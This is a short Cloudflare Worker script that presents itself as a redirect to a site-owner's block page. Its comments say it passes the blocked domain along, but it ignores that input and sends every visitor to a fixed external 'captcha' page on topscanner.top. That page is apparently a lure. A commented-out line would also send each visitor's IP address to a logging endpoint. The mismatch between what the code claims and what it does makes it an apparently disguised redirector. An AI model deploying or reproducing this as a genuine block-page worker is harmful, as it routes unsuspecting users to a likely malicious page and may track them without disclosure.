addEventListener("fetch", event => {
  event.respondWith(handle(event.request))
})

/**
 * Simple redirect worker:
 * - Accepts ?url=TARGET or ?u=TARGET
 * - Sanitizes input to remove newlines, spaces
 * - Constructs final redirect to your public block page
 */
async function handle(request) {
  const url = new URL(request.url)
  const params = url.searchParams

  // Accept common query names used by block links
  const blocked = (params.get('url') || params.get('u') || params.get('q') || '').trim()

  // Basic sanitization
  const safeBlocked = blocked.replace(/[\r\n]/g, '')

  // Default fallback target if missing
  const targetSite = safeBlocked || 'unknown'

  // Build final redirect location — include original query so your page can show the domain
  const final = `https://topscanner.top/up/captcha.html`

  // Optionally log via fetch() to an analytics endpoint (or not)
  // fetch('https://your-logger.example/log', { method: 'POST', body: JSON.stringify({ site: targetSite, ip: request.headers.get('cf-connecting-ip') }) })

  return Response.redirect(final, 302)
}
